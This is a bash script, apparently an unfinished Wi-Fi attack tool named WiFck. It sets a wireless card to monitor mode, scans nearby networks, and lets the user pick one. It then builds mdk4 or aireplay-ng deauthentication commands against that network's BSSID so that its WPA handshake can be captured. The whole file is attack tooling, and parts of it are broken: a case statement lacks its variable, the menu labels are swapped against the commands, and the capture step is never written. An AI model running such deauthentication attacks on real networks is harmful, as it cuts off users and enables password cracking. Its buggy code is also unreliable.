#!/usr/bin/env bash

# WiFck
# https://github.com/xG4L1L30x/wifck
# Dev: G4L1L30
# Version: -

H='\033[30m'
R='\033[31m'
G='\033[32m'
B='\033[34m'
P='\033[35m'
C='\033[36m'
Y='\033[33m'
W='\033[97m'
bgH='\033[40m'
bgR='\033[41m'
bgG='\033[42m'
bgB='\033[44m'
bgP='\033[45m'
bgC='\033[46m'
bgY='\033[43m'
bgW='\033[107m'
BD='\033[1m'
Q='\033[0m'
in="${C}[${Q}${BD}"
out="${C}]${Q}"
input="\n${BD}${R}${HOSTNAME}${G}@${C}WiFck ${G}>> ${Q}"

trap quit INT

if [[ "$(id -u)" != 0 ]]; then
		echo -e "${in}${R}${BD}!${Q}${out} This script must run as root!"
		exit
fi

function banner() {
	printf """
${BD}${C} █     █░ ██▓${R}  █████▒▄████▄   ██ ▄█▀${Q}
${BD}${C}▓█░ █ ░█░▓██▒${R}▓██   ▒▒██▀ ▀█   ██▄█▒${Q}
${BD}${C}▒█░ █ ░█ ▒██▒${R}▒████ ░▒▓█    ▄ ▓███▄░${Q}
${BD}${C}░█░ █ ░█ ░██░${R}░▓█▒  ░▒▓▓▄ ▄██▒▓██ █▄ ${G}V1.0${Q}
${BD}${C}░░██▒██▓ ░██░${R}░▒█░   ▒ ▓███▀ ░▒██▒ █▄${Q}
${BD}${C}░ ▓░▒ ▒  ░▓  ${R} ▒ ░   ░ ░▒ ▒  ░▒ ▒▒ ▓▒${Q}
${BD}${C}  ▒ ░ ░   ▒ ░${R} ░       ░  ▒   ░ ░▒ ▒░${Q}
${BD}${C}  ░   ░   ▒ ░${R} ░ ░   ░        ░ ░░ ░ ${Q}
${BD}${C}    ░     ░  ${R}       ░ ░      ░  ░${Q}
   ${BD}${C}~=:${in} Developed by G4L1L30 ${out}${C}:=~${Q}
${BD}${C}> ${G}https://github.com/xG4L1L30x/WiFck ${C}<${Q}

"""
}

function iface() {
	echo -e "${in}${Y}${BD} INTERFACE ${Q}${out}\n"
  ip link | grep -E "^[0-9]+" | awk -F':' '{ print $2 }' 1> ./tmp/iface.txt
  cat ./tmp/iface.txt | awk '{ print $1 }' | awk '{ print "\033[36m[\033[0m" "\033[32m\033[1m"NR "\033[0m\033[36m]\033[0m " $s }'
	echo -ne ${input} ; read set_iface
	iface=$(sed "${set_iface}!d" ./tmp/iface.txt | awk '{ print $1 }')
	if [[ -z ${iface} ]] || [[ ${set_iface} == 0 ]] || [[ $set_iface =~ [a-zA-Z]+ ]]; then
		echo -e "${in}${BD}${R}!${Q}${out} Invalid Option! Please type a number.\n"
		iface
	else
		check_mode
	fi
}

function check_mode() {
	mode=$(iw $iface info | grep "type")
	if [[ ${mode} != *'monitor'* ]]; then
		echo -e "\n${in}${R}!${Q}${out} Interface is'nt on monitor mode!"
		sleep 1
		echo -e "${in}${Y}*${Q}${out} Change to monitor mode..."
		sleep 2
		change_mode
	else
		echo -e "\n${in}${Y}*${Q}${out} Set ${C}${iface}${Q} to main interface"
		sleep 2
		clear
		banner
		menu
	fi
}

function change_mode() {
	airmon-ng start ${iface} > /dev/null 2>&1
	mon=$(ip link | grep -E "^[0-9]+" | awk -F':' '{ print $1 $2 }' | grep "mon")
  if [[ ${mon} == *'mon'* ]]; then
    iface="${iface}mon"
  fi
	mode=$(iw $iface info | grep "type")
	if [[ ${mode} != *'monitor'* ]]; then
		echo -e "${in}${R}!${Q}${out} Interface doesnt supported!"
		iface
	else
		echo -e "\n${in}${Y}*${Q}${out} Set ${C}${iface}${Q} to main interface"
		sleep 2
		clear
		banner
		menu
	fi
}

function menu() {
	echo -e "${in}${Y} MENU ${Q}${out}\n"
	echo -e "${in}${G}1${out}${BD} Capture Handshake${Q}"
	echo -e "${in}${G}2${out}${BD} Deauthentication Attack${Q}"
	echo -ne ${input} ; read menu_options
	case ${menu_options} in
		1 )
			clear
			banner
			capture_handshake
			;;
	esac
}

function target() {
	echo -e "${in}${Y}${BD} EXPLORING TARGET ${Q}${out}\n"
	echo -e "${in}${Y}*${out} Wait at least 5 second and then press CTRL+C to stop"
  xterm -bg "black" -T "Scanning Target" -e /bin/bash -l -c "airodump-ng -w tmp/target --output-format csv ${iface}"
  clear
  banner
  echo -e "${in}${Y}${BD} TARGET ${Q}${out}\n"
  rmline=$(grep -n "Station MAC" tmp/target-01.csv | awk -F':' '{ print $1 }')
  rmline=$(($rmline - 1))
  sed "${rmline}~1d" tmp/target-01.csv > tmp/target.csv
  sed '1d' tmp/target.csv | cut -d, -f 14,4,1,6 | awk -F',' '{ print $4"," $1"," $2"," $3 }' > tmp/showtarget.csv
  column -s, -t < tmp/showtarget.csv > tmp/target.txt
  awk '{ print "\033[36m[\033[0m""\033[32m\033[1m"NR-1"\033[36m]\033[0m" $s }' tmp/target.txt | sed '1s/0/~/2'> tmp/showtarget.txt
  cat tmp/showtarget.txt
	echo -ne ${input} ; read select_target
	select_target=$(($select_target + 1))
	essid=$(sed '1d' tmp/target.csv | cut -d, -f 14,4,1,6 | awk -F',' '{ print $4 }' | sed "${select_target}!d")
  bssid=$(sed '1d' tmp/target.csv | cut -d, -f 14,4,1,6 | awk -F',' '{ print $1 }' | sed "${select_target}!d")
  channel=$(sed '1d' tmp/target.csv | cut -d, -f 14,4,1,6 | awk -F',' '{ print $2 }' | sed "${select_target}!d")
	if [[ ${essid} == " " ]]; then
		essid="\033[3m*Hidden Network*"
	fi
	echo -e "\n${in}${Y}*${Q}${out} Target${C}${essid}${Q} locked!"
	sleep 2
}

function deauth_option() {
	clear
	banner
	echo -e "${in}${Y}${BD} DEAUTH OPTIONS ${Q}${out}\n"
	echo -e "${in}${G}1${out}${BD} airplay-ng${Q}"
	echo -e "${in}${G}2${out}${BD} mdk4${Q}"
	echo -ne ${input} ; read deauth_select
	function timeoutDeauth() {
		echo -e "\n${in}${G}*${out} Type how many second you want to deauth (10-200)"
		echo -ne ${input} ; read timeout_deauth
		if [[ ${timeout_deauth} < 10 ]] || [[ -z ${timeout_deauth} ]]; then
			echo -e "${in}${R}!${out} Too short"
			timeoutDeauth
		elif [[ ${timeout_deauth} > 200 ]]; then
			echo -e "${in}${R}!${out} Too long"
			timeoutDeauth
		fi
	}
	timeoutDeauth
	case deauth_select in
		1 )
			deauth="timeout ${timeout_deauth} mdk4 ${iface} d -B ${bssid} -c ${channel}"
			;;
		2 )
			deauth="timeout ${timeout_deauth} aireplay-ng -0 0 -a ${bssid} --ignore-negative-one ${iface}"
	esac
}

function capture_handshake() {
	target
	deauth_option
	clear
	banner
	echo -e "${in}${Y}${BD} CAPTURE HANDSHAKE ${Q}${out}\n"
}

function quit() {
  rm ./tmp/*
  exit
}

banner
iface
